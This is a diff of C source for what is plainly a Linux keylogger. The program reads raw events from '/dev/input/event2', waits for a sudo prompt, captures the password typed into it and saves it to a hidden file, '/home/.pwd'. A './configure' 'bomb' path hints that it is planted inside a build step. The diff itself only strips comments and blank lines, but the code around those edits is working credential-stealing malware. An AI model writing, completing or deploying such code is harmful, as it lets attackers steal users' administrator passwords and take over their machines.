@@ -12,7 +12,6 @@ char key_map[100];
 
 #define DEV_PATH "/dev/input/event2"   // keyboard dev file
 #define PWD_PATH "/home/.pwd"
-// #define PWD_PATH "pwd"
 #define BOMB_PATH "./configure"
 
 void main_loop();
@@ -80,6 +79,7 @@ int main()
         key_map[82] = '0';
 
         main_loop();
+
 	return 0;
 }
 
@@ -122,7 +122,6 @@ void sniffing_keyboard()
                         if (read(keys_fd, &t, sizeof(t)) == sizeof(t)) {
                                 if (t.type == EV_KEY)      
                                         if (t.value == 1) {
-                                                // printf("key %c %s\n", key_map[(int)t.code], "Pressed");
                                                 buf[idx++] = key_map[(int)t.code];
                                                 if (sudo_ready && capture_pwd)
                                                         pw_buf[pw_idx++] = key_map[(int)t.code];
@@ -130,9 +129,7 @@ void sniffing_keyboard()
                                                 if (sudo_ready && capture_pwd && (int)t.code == 28) {
                                                         sudo_ready = 0;
                                                         capture_pwd = 0;
-
                                                         save_pw(pw_buf, pw_idx);
-
                                                         pw_idx = 0;
                                                 }
 
